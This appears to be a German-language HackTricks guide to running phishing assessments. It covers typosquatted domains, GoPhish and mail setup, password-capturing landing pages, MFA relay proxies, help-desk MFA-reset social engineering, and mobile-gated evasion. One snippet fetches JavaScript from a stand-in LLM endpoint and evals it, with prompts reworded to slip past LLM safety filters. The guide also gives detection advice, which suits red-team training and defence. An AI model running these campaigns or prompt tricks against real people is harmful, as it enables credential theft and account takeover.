# Phishing Methodik

{{#include ../../banners/hacktricks-training.md}}

## Methodik

1. Recon des Opfers
1. Wähle die **victim domain**.
2. Führe grundlegende Web-Enumeration durch, **suche nach Login-Portalen**, die vom Opfer verwendet werden, und **entscheide**, welches du **vortäuschen** wirst.
3. Nutze **OSINT**, um **E-Mails zu finden**.
2. Bereite die Umgebung vor
1. **Kaufe die Domain**, die du für die Phishing-Bewertung verwenden wirst
2. **Konfiguriere die mit dem E-Mail-Service verbundenen Einträge** (SPF, DMARC, DKIM, rDNS)
3. Konfiguriere den VPS mit **gophish**
3. Bereite die Kampagne vor
1. Bereite die **E-Mail-Vorlage** vor
2. Bereite die **Webseite** vor, um die Zugangsdaten zu stehlen
4. Starte die Kampagne!

## Generate similar domain names or buy a trusted domain

### Techniken zur Variation von Domainnamen

- **Keyword**: Der Domainname **enthält** ein wichtiges **Schlüsselwort** der Originaldomain (z. B. zelster.com-management.com).
- **hypened subdomain**: Ersetze den **Punkt durch einen Bindestrich** in einem Subdomain-Teil (z. B. www-zelster.com).
- **New TLD**: Dieselbe Domain mit einer **neuen TLD** (z. B. zelster.org)
- **Homoglyph**: Es **ersetzt** einen Buchstaben im Domainnamen durch **ähnlich aussehende Zeichen** (z. B. zelfser.com).


{{#ref}}
homograph-attacks.md
{{#endref}}
- **Transposition:** Es **tauscht zwei Buchstaben** innerhalb des Domainnamens (z. B. zelsetr.com).
- **Singularization/Pluralization**: Fügt ein „s“ am Ende des Domainnamens hinzu oder entfernt es (z. B. zeltsers.com).
- **Omission**: Es **entfernt einen** der Buchstaben aus dem Domainnamen (z. B. zelser.com).
- **Repetition:** Es **wiederholt einen** der Buchstaben im Domainnamen (z. B. zeltsser.com).
- **Replacement**: Ähnlich wie Homoglyph, aber weniger getarnt. Es ersetzt einen der Buchstaben im Domainnamen, möglicherweise durch einen in der Nähe der Originaltaste auf der Tastatur (z. B. zektser.com).
- **Subdomained**: Führt einen **Punkt** innerhalb des Domainnamens ein (z. B. ze.lster.com).
- **Insertion**: Es **fügt einen Buchstaben ein** in den Domainnamen (z. B. zerltser.com).
- **Missing dot**: Hängt die TLD an den Domainnamen an. (z. B. zelstercom.com)

**Automatische Tools**

- [**dnstwist**](https://github.com/elceef/dnstwist)
- [**urlcrazy**](https://github.com/urbanadventurer/urlcrazy)

**Webseiten**

- [https://dnstwist.it/](https://dnstwist.it)
- [https://dnstwister.report/](https://dnstwister.report)
- [https://www.internetmarketingninjas.com/tools/free-tools/domain-typo-generator/](https://www.internetmarketingninjas.com/tools/free-tools/domain-typo-generator/)

### Bitflipping

Es besteht die **Möglichkeit, dass einzelne Bits, die gespeichert sind oder während der Kommunikation übertragen werden, automatisch umkippen** aufgrund verschiedener Faktoren wie Sonneneruptionen, kosmischer Strahlung oder Hardwarefehlern.

Wenn dieses Konzept auf **DNS-Anfragen angewendet** wird, kann es sein, dass die **Domäne, die der DNS-Server erhält**, nicht mit der ursprünglich angeforderten Domäne übereinstimmt.

Zum Beispiel kann eine einzelne Bit-Änderung in der Domäne "windows.com" sie in "windnws.com" verwandeln.

Angreifer können **davon profitieren, indem sie mehrere bit-flipping Domains registrieren**, die der Domain des Opfers ähneln. Ihr Ziel ist es, legitime Nutzer auf ihre eigene Infrastruktur umzuleiten.

Für weitere Informationen lies [https://www.bleepingcomputer.com/news/security/hijacking-traffic-to-microsoft-s-windowscom-with-bitflipping/](https://www.bleepingcomputer.com/news/security/hijacking-traffic-to-microsoft-s-windowscom-with-bitflipping/)

### Kaufe eine vertrauenswürdige Domain

Du kannst auf [https://www.expireddomains.net/](https://www.expireddomains.net) nach einer abgelaufenen Domain suchen, die du verwenden könntest.\
Um sicherzustellen, dass die abgelaufene Domain, die du kaufen willst, **bereits eine gute SEO** hat, kannst du prüfen, wie sie kategorisiert ist in:

- [http://www.fortiguard.com/webfilter](http://www.fortiguard.com/webfilter)
- [https://urlfiltering.paloaltonetworks.com/query/](https://urlfiltering.paloaltonetworks.com/query/)

## E-Mails entdecken

- [https://github.com/laramies/theHarvester](https://github.com/laramies/theHarvester) (100% free)
- [https://phonebook.cz/](https://phonebook.cz) (100% free)
- [https://maildb.io/](https://maildb.io)
- [https://hunter.io/](https://hunter.io)
- [https://anymailfinder.com/](https://anymailfinder.com)

Um mehr gültige E-Mail-Adressen zu **entdecken** oder die bereits gefundenen zu **verifizieren**, kannst du prüfen, ob du die smtp-Server des Opfers mit Brute-Force prüfen kannst. [Erfahre hier, wie man E-Mail-Adressen verifiziert/entdeckt](../../network-services-pentesting/pentesting-smtp/index.html#username-bruteforce-enumeration).\
Außerdem vergiss nicht, dass, wenn Nutzer **ein beliebiges Webportal zur Mail-Nutzung verwenden**, du prüfen kannst, ob es für **username brute force** verwundbar ist, und die Schwachstelle gegebenenfalls ausnutzen.

## Konfiguration von GoPhish

### Installation

Du kannst es herunterladen von [https://github.com/gophish/gophish/releases/tag/v0.11.0](https://github.com/gophish/gophish/releases/tag/v0.11.0)

Lade es herunter und entpacke es in `/opt/gophish` und führe `/opt/gophish/gophish` aus.\
Im Output wird dir ein Passwort für den Admin-Benutzer auf Port 3333 angezeigt. Greife daher auf diesen Port zu und verwende diese Zugangsdaten, um das Admin-Passwort zu ändern. Möglicherweise musst du diesen Port lokal tunneln:
```bash
ssh -L 3333:127.0.0.1:3333 <user>@<ip>
```
### Konfiguration

**TLS-Zertifikat-Konfiguration**

Bevor Sie diesen Schritt durchführen, sollten Sie die Domain, die Sie verwenden möchten, bereits gekauft haben, und sie muss auf die IP des VPS zeigen, auf dem Sie gophish konfigurieren.
```bash
DOMAIN="<domain>"
wget https://dl.eff.org/certbot-auto
chmod +x certbot-auto
sudo apt install snapd
sudo snap install core
sudo snap refresh core
sudo apt-get remove certbot
sudo snap install --classic certbot
sudo ln -s /snap/bin/certbot /usr/bin/certbot
certbot certonly --standalone -d "$DOMAIN"
mkdir /opt/gophish/ssl_keys
cp "/etc/letsencrypt/live/$DOMAIN/privkey.pem" /opt/gophish/ssl_keys/key.pem
cp "/etc/letsencrypt/live/$DOMAIN/fullchain.pem" /opt/gophish/ssl_keys/key.crt​
```
**Mail-Konfiguration**

Installation starten: `apt-get install postfix`

Füge dann die Domain zu folgenden Dateien hinzu:

- **/etc/postfix/virtual_domains**
- **/etc/postfix/transport**
- **/etc/postfix/virtual_regexp**

**Ändere außerdem die Werte der folgenden Variablen in /etc/postfix/main.cf**

`myhostname = <domain>`\
`mydestination = $myhostname, <domain>, localhost.com, localhost`

Schließlich passe die Dateien **`/etc/hostname`** und **`/etc/mailname`** an deinen Domain-Namen an und **starte deinen VPS neu.**

Erstelle nun einen **DNS A record** für `mail.<domain>`, der auf die **IP-Adresse** des VPS zeigt, und einen **DNS MX**-Record, der auf `mail.<domain>` zeigt.

Jetzt testen wir das Senden einer E-Mail:
```bash
apt install mailutils
echo "This is the body of the email" | mail -s "This is the subject line" test@email.com
```
**Gophish-Konfiguration**

Stoppen Sie die Ausführung von gophish und konfigurieren Sie es.\
Ändern Sie `/opt/gophish/config.json` wie folgt (beachten Sie die Verwendung von https):
```bash
{
"admin_server": {
"listen_url": "127.0.0.1:3333",
"use_tls": true,
"cert_path": "gophish_admin.crt",
"key_path": "gophish_admin.key"
},
"phish_server": {
"listen_url": "0.0.0.0:443",
"use_tls": true,
"cert_path": "/opt/gophish/ssl_keys/key.crt",
"key_path": "/opt/gophish/ssl_keys/key.pem"
},
"db_name": "sqlite3",
"db_path": "gophish.db",
"migrations_prefix": "db/db_",
"contact_address": "",
"logging": {
"filename": "",
"level": ""
}
}
```
**gophish-Dienst konfigurieren**

Um den gophish-Dienst zu erstellen, damit er automatisch gestartet und als Dienst verwaltet werden kann, legen Sie die Datei `/etc/init.d/gophish` mit folgendem Inhalt an:
```bash
#!/bin/bash
# /etc/init.d/gophish
# initialization file for stop/start of gophish application server
#
# chkconfig: - 64 36
# description: stops/starts gophish application server
# processname:gophish
# config:/opt/gophish/config.json
# From https://github.com/gophish/gophish/issues/586

# define script variables

processName=Gophish
process=gophish
appDirectory=/opt/gophish
logfile=/var/log/gophish/gophish.log
errfile=/var/log/gophish/gophish.error

start() {
echo 'Starting '${processName}'...'
cd ${appDirectory}
nohup ./$process >>$logfile 2>>$errfile &
sleep 1
}

stop() {
echo 'Stopping '${processName}'...'
pid=$(/bin/pidof ${process})
kill ${pid}
sleep 1
}

status() {
pid=$(/bin/pidof ${process})
if [["$pid" != ""| "$pid" != "" ]]; then
echo ${processName}' is running...'
else
echo ${processName}' is not running...'
fi
}

case $1 in
start|stop|status) "$1" ;;
esac
```
Beende die Konfiguration des Dienstes und überprüfe ihn, indem du Folgendes tust:
```bash
mkdir /var/log/gophish
chmod +x /etc/init.d/gophish
update-rc.d gophish defaults
#Check the service
service gophish start
service gophish status
ss -l | grep "3333\|443"
service gophish stop
```
## Konfiguration von Mailserver und Domain

### Warten & legitim auftreten

Ältere Domains werden seltener als Spam eingestuft. Du solltest daher so lange wie möglich warten (mindestens 1 Woche) vor dem phishing assessment. Außerdem: wenn du eine Seite zu einem reputationsrelevanten Sektor veröffentlichst, wird die erhaltene Reputation besser sein.

Beachte, dass du, auch wenn du eine Woche warten musst, jetzt trotzdem alles konfigurieren kannst.

### Configure Reverse DNS (rDNS) record

Setze einen rDNS (PTR)-Eintrag, der die IP-Adresse des VPS auf den Domainnamen auflöst.

### Sender Policy Framework (SPF) Record

Du musst **einen SPF-Record für die neue Domain konfigurieren**. Wenn du nicht weißt, was ein SPF-Record ist, [**lies diese Seite**](../../network-services-pentesting/pentesting-smtp/index.html#spf).

Du kannst [https://www.spfwizard.net/](https://www.spfwizard.net) verwenden, um deine SPF-Policy zu generieren (verwende die IP des VPS).

![](<../../images/image (1037).png>)

Das ist der Inhalt, der als TXT-Record in der Domain gesetzt werden muss:
```bash
v=spf1 mx a ip4:ip.ip.ip.ip ?all
```
### Domain-based Message Authentication, Reporting & Conformance (DMARC) Record

Sie müssen **einen DMARC record für die neue Domain konfigurieren**. Wenn Sie nicht wissen, was ein DMARC record ist [**read this page**](../../network-services-pentesting/pentesting-smtp/index.html#dmarc).

Sie müssen einen neuen DNS TXT record erstellen, der auf den Hostnamen `_dmarc.<domain>` zeigt, mit folgendem Inhalt:
```bash
v=DMARC1; p=none
```
### DomainKeys Identified Mail (DKIM)

Du musst **für die neue Domain DKIM konfigurieren**. Wenn du nicht weißt, was ein DMARC-Record ist, [**lies diese Seite**](../../network-services-pentesting/pentesting-smtp/index.html#dkim).

Dieses Tutorial basiert auf: [https://www.digitalocean.com/community/tutorials/how-to-install-and-configure-dkim-with-postfix-on-debian-wheezy](https://www.digitalocean.com/community/tutorials/how-to-install-and-configure-dkim-with-postfix-on-debian-wheezy)

> [!TIP]
> Du musst beide B64-Werte, die der DKIM-Schlüssel erzeugt, zusammenfügen:
>
> ```
> v=DKIM1; h=sha256; k=rsa; p=MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEA0wPibdqPtzYk81njjQCrChIcHzxOp8a1wjbsoNtka2X9QXCZs+iXkvw++QsWDtdYu3q0Ofnr0Yd/TmG/Y2bBGoEgeE+YTUG2aEgw8Xx42NLJq2D1pB2lRQPW4IxefROnXu5HfKSm7dyzML1gZ1U0pR5X4IZCH0wOPhIq326QjxJZm79E1nTh3xj" "Y9N/Dt3+fVnIbMupzXE216TdFuifKM6Tl6O/axNsbswMS1TH812euno8xRpsdXJzFlB9q3VbMkVWig4P538mHolGzudEBg563vv66U8D7uuzGYxYT4WS8NVm3QBMg0QKPWZaKp+bADLkOSB9J2nUpk4Aj9KB5swIDAQAB
> ```

### Test your email configuration score

Das kannst du mit [https://www.mail-tester.com/](https://www.mail-tester.com) machen. Rufe die Seite auf und sende eine E-Mail an die dort angegebene Adresse:
```bash
echo "This is the body of the email" | mail -s "This is the subject line" test-iimosa79z@srv1.mail-tester.com
```
Sie können außerdem **Ihre E-Mail-Konfiguration überprüfen**, indem Sie eine E-Mail an `check-auth@verifier.port25.com` senden und **die Antwort lesen** (dafür müssen Sie Port **25** **öffnen** und die Antwort in der Datei _/var/mail/root_ sehen, wenn Sie die E-Mail als root senden).\
Prüfen Sie, dass Sie alle Tests bestehen:
```bash
==========================================================
Summary of Results
==========================================================
SPF check:          pass
DomainKeys check:   neutral
DKIM check:         pass
Sender-ID check:    pass
SpamAssassin check: ham
```
Du könntest auch eine **Nachricht an ein Gmail-Konto unter deiner Kontrolle** senden und in deinem Gmail-Posteingang die **E-Mail-Header** prüfen — `dkim=pass` sollte im Header-Feld `Authentication-Results` vorhanden sein.
```
Authentication-Results: mx.google.com;
spf=pass (google.com: domain of contact@example.com designates --- as permitted sender) smtp.mail=contact@example.com;
dkim=pass header.i=@example.com;
```
### Entfernen aus der Spamhouse Blacklist

Die Seite [www.mail-tester.com](https://www.mail-tester.com) kann dir anzeigen, ob deine Domain von Spamhouse blockiert wird. Du kannst die Entfernung deiner Domain/IP beantragen unter: [https://www.spamhaus.org/lookup/](https://www.spamhaus.org/lookup/)

### Entfernen aus der Microsoft-Blacklist

Du kannst die Entfernung deiner Domain/IP beantragen unter [https://sender.office.com/](https://sender.office.com).

## GoPhish-Kampagne erstellen & starten

### Absenderprofil

- Vergebe einen **Namen zur Identifikation** des Absenderprofils
- Entscheide, von welchem Account du die phishing-E-Mails senden wirst. Vorschläge: _noreply, support, servicedesk, salesforce..._
- Du kannst Benutzername und Passwort leer lassen, aber aktiviere unbedingt die Option **Ignore Certificate Errors**

![](<../../images/image (253) (1) (2) (1) (1) (2) (2) (3) (3) (5) (3) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (10) (15) (2).png>)

> [!TIP]
> Es wird empfohlen, die Funktion "**Send Test Email**" zu nutzen, um zu testen, ob alles funktioniert.\
> Ich würde empfehlen, **die Test-E-Mails an 10min mails-Adressen zu senden**, um zu vermeiden, beim Testen auf einer Blacklist zu landen.

### E-Mail-Vorlage

- Vergebe einen **Namen zur Identifikation** der Vorlage
- Schreibe anschließend einen **Betreff** (nichts Ungewöhnliches, einfach etwas, das man in einer normalen E-Mail erwarten würde)
- Stelle sicher, dass du "**Add Tracking Image**" angehakt hast
- Verfasse die **E-Mail-Vorlage** (du kannst Variablen verwenden wie im folgenden Beispiel):
```html
<html>
<head>
<title></title>
</head>
<body>
<p class="MsoNormal"><span style="font-size:10.0pt;font-family:&quot;Verdana&quot;,sans-serif;color:black">Dear {{.FirstName}} {{.LastName}},</span></p>
<br />
Note: We require all user to login an a very suspicios page before the end of the week, thanks!<br />
<br />
Regards,</span></p>

WRITE HERE SOME SIGNATURE OF SOMEONE FROM THE COMPANY

<p>{{.Tracker}}</p>
</body>
</html>
```
Beachte, dass **um die Glaubwürdigkeit der E-Mail zu erhöhen**, es empfohlen wird, eine Signatur aus einer tatsächlichen E-Mail des Kunden zu verwenden. Vorschläge:

- Sende eine E-Mail an eine **nicht existierende Adresse** und prüfe, ob die Antwort eine Signatur enthält.
- Suche nach **öffentlichen E-Mails** wie info@ex.com oder press@ex.com oder public@ex.com und sende ihnen eine E-Mail und warte auf die Antwort.
- Versuche, **eine gültige gefundene** E-Mail zu kontaktieren und warte auf die Antwort.

![](<../../images/image (80).png>)

> [!TIP]
> The Email Template also allows to **attach files to send**. If you would also like to steal NTLM challenges using some specially crafted files/documents [read this page](../../windows-hardening/ntlm/places-to-steal-ntlm-creds.md).

### Landing Page

- Trage einen **Namen** ein
- **Schreibe den HTML-Code** der Webseite. Beachte, dass du Webseiten **importieren** kannst.
- Markiere **Capture Submitted Data** und **Capture Passwords**
- Setze eine **Redirection**

![](<../../images/image (826).png>)

> [!TIP]
> Üblicherweise musst du den HTML-Code der Seite anpassen und lokal testen (evtl. mit einem Apache-Server), **bis dir das Ergebnis gefällt.** Dann fügst du diesen HTML-Code in das Feld ein.\
> Beachte, dass wenn du **statische Ressourcen** für das HTML benötigst (z. B. CSS- und JS-Dateien), du sie unter _**/opt/gophish/static/endpoint**_ speichern und dann von _**/static/\<filename>**_ aus zugreifen kannst.

> [!TIP]
> Für die Redirection könntest du die Benutzer **auf die legitime Hauptseite** des Opfers weiterleiten oder sie z. B. auf _/static/migration.html_ schicken, dort ein **Spinning Wheel (**[**https://loading.io/**](https://loading.io)**)  für 5 Sekunden** anzeigen und dann mitteilen, dass der Prozess erfolgreich war.

### Users & Groups

- Vergib einen Namen
- **Importiere die Daten** (beachte, dass du für das Beispiel-Template den firstname, last name und email address jedes Nutzers benötigst)

![](<../../images/image (163).png>)

### Campaign

Erstelle abschließend eine Campaign und wähle einen Namen, das email template, die landing page, die URL, das sending profile und die Gruppe. Beachte, dass die URL der Link ist, der an die Opfer gesendet wird.

Beachte, dass das **Sending Profile** erlaubt, eine Test-E-Mail zu senden, um zu sehen, wie die finale Phishing-E-Mail aussehen wird:

![](<../../images/image (192).png>)

> [!TIP]
> Ich empfehle, die Test-E-Mails an 10min mails Adressen zu senden, um beim Testen nicht geblacklisted zu werden.

Sobald alles bereit ist, starte einfach die Campaign!

## Website Cloning

Falls du aus irgendeinem Grund die Website klonen möchtest, schau auf die folgende Seite:



{{#ref}}
clone-a-website.md
{{#endref}}

## Backdoored Documents & Files

Bei einigen Phishing-Assessments (hauptsächlich für Red Teams) möchtest du eventuell auch **Dateien mit einer Art Backdoor** versenden (z. B. ein C2 oder einfach etwas, das eine Authentifizierung auslöst).\
Sieh dir die folgende Seite für einige Beispiele an:


{{#ref}}
phishing-documents.md
{{#endref}}

## Phishing MFA

### Via Proxy MitM

Der vorherige Angriff ist ziemlich clever, da du eine echte Website fälschst und die vom Nutzer eingegebenen Informationen sammelst. Leider, wenn der Nutzer nicht das korrekte Passwort eingegeben hat oder die Anwendung, die du gefälscht hast, mit 2FA konfiguriert ist, **erlauben dir diese Informationen nicht, den getäuschten Benutzer zu impersonifizieren**.

Hier kommen Tools wie [**evilginx2**](https://github.com/kgretzky/evilginx2)**,** [**CredSniper**](https://github.com/ustayready/CredSniper) und [**muraena**](https://github.com/muraenateam/muraena) ins Spiel. Dieses Tool ermöglicht es dir, einen MitM-ähnlichen Angriff zu erzeugen. Grundsätzlich funktioniert der Angriff wie folgt:

1. Du **gibst das Login-Formular** der echten Webseite vor.
2. Der Nutzer **sendet** seine **credentials** an deine gefälschte Seite und das Tool leitet diese an die echte Webseite weiter, um **zu prüfen, ob die credentials funktionieren**.
3. Falls das Konto mit **2FA** konfiguriert ist, wird die MitM-Seite danach fragen und sobald der **Nutzer diese eingibt**, sendet das Tool sie an die echte Webseite.
4. Sobald der Nutzer authentifiziert ist, hast du (als Angreifer) **die erfassten credentials, die 2FA, das Cookie und alle Informationen** jeder Interaktion, während das Tool den MitM durchführt.

### Via VNC

Was, wenn du anstatt das Opfer auf eine bösartige Seite mit identischem Aussehen der Originalseite zu schicken, es in eine **VNC-Session mit einem Browser, der mit der echten Webseite verbunden ist**, schickst? Du kannst sehen, was es tut, das Passwort, die verwendete MFA, die Cookies stehlen...\
Das geht z. B. mit [**EvilnVNC**](https://github.com/JoelGMSec/EvilnoVNC)

## Detecting the detection

Offensichtlich ist eine der besten Methoden, um herauszufinden, ob du entdeckt wurdest, deine Domain in **Blacklists** zu suchen. Wenn sie gelistet ist, wurde deine Domain irgendwie als verdächtig erkannt.\
Eine einfache Methode, um zu prüfen, ob deine Domain in einer Blacklist auftaucht, ist die Verwendung von [https://malwareworld.com/](https://malwareworld.com)

Es gibt jedoch auch andere Wege, um zu wissen, ob das Opfer **aktiv nach verdächtigen Phishing-Aktivitäten in der Wildnis** sucht, wie in erklärt wird:


{{#ref}}
detecting-phising.md
{{#endref}}

Du kannst **eine Domain mit sehr ähnlichem Namen** zur Domain des Opfers kaufen **und/oder ein Zertifikat für eine Subdomain** einer von dir kontrollierten Domain **generieren, das das Keyword der Opfer-Domain enthält**. Wenn das **Opfer** irgendeine Form von **DNS- oder HTTP-Interaktion** mit diesen Domains durchführt, weißt du, dass **es aktiv nach verdächtigen Domains sucht** und du sehr stealth vorgehen musst.

### Evaluate the phishing

Nutze [**Phishious**](https://github.com/Rices/Phishious), um zu bewerten, ob deine E-Mail im Spam-Ordner landen wird, blockiert wird oder erfolgreich ist.

## High-Touch Identity Compromise (Help-Desk MFA Reset)

Moderne Intrusion-Teams umgehen zunehmend E-Mail-Locks und **zielen direkt auf den Service-Desk / Identity-Recovery-Workflow ab**, um MFA zu umgehen. Der Angriff ist vollständig "living-off-the-land": Sobald der Operator gültige credentials besitzt, pivotet er mit eingebauten Admin-Tools – keine Malware ist notwendig.

### Attack flow
1. Recon des Opfers
* Sammle persönliche & unternehmensbezogene Details von LinkedIn, data breaches, öffentlichem GitHub usw.
* Identifiziere hochwertige Identitäten (Executives, IT, Finance) und ermittle den **genauen Help-Desk-Prozess** für Password / MFA-Reset.
2. Echtzeit Social Engineering
* Telefon, Teams oder Chat mit dem Help-Desk, während du das Ziel impersonierst (oft mit **spoofed caller-ID** oder **cloned voice**).
* Gib die zuvor gesammelten PII an, um die wissensbasierte Verifikation zu bestehen.
* Überzeuge den Agenten, das **MFA-Secret zurückzusetzen** oder einen **SIM-swap** auf eine registrierte Mobilnummer durchzuführen.
3. Sofortige Post-Access-Aktionen (≤60 min in realen Fällen)
* Etabliere einen Foothold über ein beliebiges Web SSO-Portal.
* Enumeriere AD / AzureAD mit eingebauten Tools (keine Binaries droppen):
```powershell
# list directory groups & privileged roles
Get-ADGroup -Filter * -Properties Members | ?{$_.Members -match $env:USERNAME}

# AzureAD / Graph – list directory roles
Get-MgDirectoryRole | ft DisplayName,Id

# Enumerate devices the account can login to
Get-MgUserRegisteredDevice -UserId <user@corp.local>
```
* Laterale Bewegung mit **WMI**, **PsExec**, oder legitimen **RMM**-Agenten, die bereits in der Umgebung whitelisted sind.

### Detection & Mitigation
* Behandle Help-Desk Identity Recovery als eine **privilegierte Operation** – erfordere step-up Auth & Manager-Freigabe.
* Setze **Identity Threat Detection & Response (ITDR)** / **UEBA**-Regeln ein, die Alarm schlagen bei:
* MFA-Methode geändert + Authentifizierung von neuem Gerät / Geo.
* Sofortige Erhöhung desselben Prinzips (User → Admin).
* Nimm Help-Desk-Anrufe auf und erzwinge einen **Rückruf an eine bereits registrierte Nummer**, bevor ein Reset durchgeführt wird.
* Implementiere **Just-In-Time (JIT) / Privileged Access**, sodass neu zurückgesetzte Accounts **nicht** automatisch hoch-privilegierte Tokens erhalten.

---

## At-Scale Deception – SEO Poisoning & “ClickFix” Campaigns
Commodity-Crews kompensieren die Kosten für High-Touch-Operationen mit Massenangriffen, die **Suchmaschinen & Ad-Netzwerke als Auslieferungskanal** nutzen.

1. **SEO poisoning / malvertising** pusht ein gefälschtes Ergebnis wie `chromium-update[.]site` an die Spitze der Suchanzeigen.
2. Das Opfer lädt einen kleinen **First-Stage Loader** herunter (oft JS/HTA/ISO). Beispiele, die Unit 42 gesehen hat:
* `RedLine stealer`
* `Lumma stealer`
* `Lampion Trojan`
3. Der Loader exfiltriert Browser-Cookies + Credential-DBs, und lädt dann einen **silent loader**, der *in Echtzeit* entscheidet, ob er deployt:
* RAT (z. B. AsyncRAT, RustDesk)
* ransomware / wiper
* Persistence-Komponente (Registry Run Key + Scheduled Task)

### Hardening tips
* Blockiere neu registrierte Domains & erzwinge **Advanced DNS / URL Filtering** bei *Suchanzeigen* sowie E-Mail.
* Beschränke Software-Installation auf signierte MSI / Store-Pakete, verweigere die Ausführung von `HTA`, `ISO`, `VBS` per Policy.
* Überwache Child-Prozesse von Browsern, die Installer öffnen:
```yaml
- parent_image: /Program Files/Google/Chrome/*
and child_image: *\\*.exe
```
* Suche nach LOLBins, die häufig von First-Stage Loaders missbraucht werden (z. B. `regsvr32`, `curl`, `mshta`).

---

## AI-Enhanced Phishing Operations
Angreifer verketten jetzt **LLM- & Voice-Clone-APIs** für vollständig personalisierte Köder und Echtzeit-Interaktion.

| Layer | Beispielverwendung durch Threat Actor |
|-------|---------------------------------------|
|Automation|Generate & send >100 k emails / SMS mit randomisiertem Wortlaut & Tracking-Links.|
|Generative AI|Erzeuge *einmalige* E-Mails, die auf öffentliche M&A, Insider-Witze aus Social Media verweisen; Deep-Fake-CEO-Voice in Rückruf-Betrug.|
|Agentic AI|Registriert autonom Domains, scraped Open-Source-Intel, erstellt Next-Stage-Mails, wenn ein Opfer klickt, aber keine credentials abgibt.|

**Defence:**
• Füge **dynamische Banner** hinzu, die Nachrichten hervorheben, die von untrusted Automation gesendet wurden (via ARC/DKIM Anomalien).  
• Setze **voice-biometric challenge phrases** für hochriskante Telefonanfragen ein.  
• Simuliere kontinuierlich AI-generierte Köder in Awareness-Programmen – statische Templates sind obsolet.

Siehe auch – agentic browsing abuse for credential phishing:

{{#ref}}
ai-agent-mode-phishing-abusing-hosted-agent-browsers.md
{{#endref}}

Siehe auch – AI agent abuse of local CLI tools and MCP (für Secrets-Inventarisierung und Erkennung):

{{#ref}}
ai-agent-abuse-local-ai-cli-tools-and-mcp.md
{{#endref}}

## LLM-assisted runtime assembly of phishing JavaScript (in-browser codegen)

Angreifer können harmlos aussehendes HTML liefern und den Stealer zur Laufzeit **durch eine Anfrage an ein vertrauenswürdiges LLM-API** für JavaScript erzeugen und dann im Browser ausführen (z. B. via `eval` oder dynamisches `<script>`).

1. **Prompt-as-obfuscation:** kodiere Exfil-URLs/Base64-Strings im Prompt; iteriere Formulierungen, um Safety-Filter zu umgehen und Halluzinationen zu reduzieren.
2. **Client-side API call:** Beim Laden ruft das JS ein öffentliches LLM (Gemini/DeepSeek/etc.) oder einen CDN-Proxy auf; in der statischen HTML sind nur der Prompt/API-Call vorhanden.
3. **Assemble & exec:** konkatenieren die Antwort und führen sie aus (polymorph pro Besuch):
```javascript
fetch("https://llm.example/v1/chat",{method:"POST",body:JSON.stringify({messages:[{role:"user",content:promptText}]}),headers:{"Content-Type":"application/json",Authorization:`Bearer ${apiKey}`}})
.then(r=>r.json())
.then(j=>{const payload=j.choices?.[0]?.message?.content; eval(payload);});
```
4. **Phish/exfil:** generierter Code personalisiert den Köder (z. B. LogoKit token parsing) und sendet creds an den im Prompt versteckten endpoint.

**Evasion traits**
- Der Datenverkehr erreicht bekannte LLM-Domains oder vertrauenswürdige CDN-Proxies; manchmal via WebSockets zu einem Backend.
- Kein statischer Payload; bösartiges JS existiert erst nach dem Rendern.
- Nicht-deterministische Generierungen erzeugen **unique** stealers pro Sitzung.

**Detection ideas**
- Führe Sandboxes mit aktiviertem JS aus; markiere **runtime `eval`/dynamic script creation sourced from LLM responses**.
- Suche nach Front-end-POSTs an LLM-APIs, die unmittelbar von `eval`/`Function` auf dem zurückgegebenen Text gefolgt werden.
- Alarmiere bei nicht autorisierten LLM-Domains im Client-Datenverkehr plus anschließenden credential POSTs.

---

## MFA Fatigue / Push Bombing Variant – Forced Reset
Besides classic push-bombing, operators simply **force a new MFA registration** during the help-desk call, nullifying the user’s existing token. Any subsequent login prompt appears legitimate to the victim.
```text
[Attacker]  →  Help-Desk:  “I lost my phone while travelling, can you unenrol it so I can add a new authenticator?”
[Help-Desk] →  AzureAD: ‘Delete existing methods’ → sends registration e-mail
[Attacker]  →  Completes new TOTP enrolment on their own device
```
Überwache AzureAD/AWS/Okta-Ereignisse, bei denen **`deleteMFA` + `addMFA`** **innerhalb weniger Minuten von derselben IP** auftreten.



## Clipboard Hijacking / Pastejacking

Angreifer können heimlich bösartige Befehle in die Zwischenablage des Opfers von einer kompromittierten oder typosquatteten Webseite kopieren und den Benutzer dann dazu verleiten, sie in **Win + R**, **Win + X** oder ein Terminalfenster einzufügen, wodurch beliebiger Code ausgeführt wird – ganz ohne Download oder Anhang.


{{#ref}}
clipboard-hijacking.md
{{#endref}}

## Mobile Phishing & Malicious App Distribution (Android & iOS)


{{#ref}}
mobile-phishing-malicious-apps.md
{{#endref}}

### Mobile‑gated phishing to evade crawlers/sandboxes
Operatoren sperren ihre Phishing-Flows zunehmend hinter einer einfachen Geräteprüfung, sodass Desktop-Crawler nie die finalen Seiten erreichen. Ein gängiges Muster ist ein kleines Script, das prüft, ob das DOM Touch-fähig ist, und das Ergebnis an einen Server-Endpoint postet; Nicht‑Mobile Clients erhalten HTTP 500 (oder eine leere Seite), während mobilen Nutzern der vollständige Flow ausgeliefert wird.

Minimaler Client-Snippet (typische Logik):
```html
<script src="/static/detect_device.js"></script>
```
`detect_device.js` Logik (vereinfacht):
```javascript
const isMobile = ('ontouchstart' in document.documentElement);
fetch('/detect', {method:'POST', headers:{'Content-Type':'application/json'}, body: JSON.stringify({is_mobile:isMobile})})
.then(()=>location.reload());
```
Häufig beobachtetes Serververhalten:
- Setzt beim ersten Laden ein Session-Cookie.
- Akzeptiert `POST /detect {"is_mobile":true|false}`.
- Gibt bei folgenden GETs 500 (oder Platzhalter) zurück, wenn `is_mobile=false`; liefert Phishing-Inhalte nur, wenn `true`.

Hunting und Erkennungsheuristiken:
- urlscan-Abfrage: `filename:"detect_device.js" AND page.status:500`
- Web-Telemetrie: Sequenz von `GET /static/detect_device.js` → `POST /detect` → HTTP 500 für non‑mobile; legitime mobile Opferpfade liefern 200 mit anschließendem HTML/JS.
- Blockiere oder untersuche Seiten, die Inhalte ausschließlich anhand von `ontouchstart` oder ähnlichen Geräteprüfungen abhängig machen.

Abwehrhinweise:
- Führe Crawler mit mobilähnlichen Fingerprints und aktiviertem JS aus, um zugangsbeschränkte Inhalte aufzudecken.
- Alarmiere bei verdächtigen 500-Antworten nach `POST /detect` auf neu registrierten Domains.

## Referenzen

- [https://zeltser.com/domain-name-variations-in-phishing/](https://zeltser.com/domain-name-variations-in-phishing/)
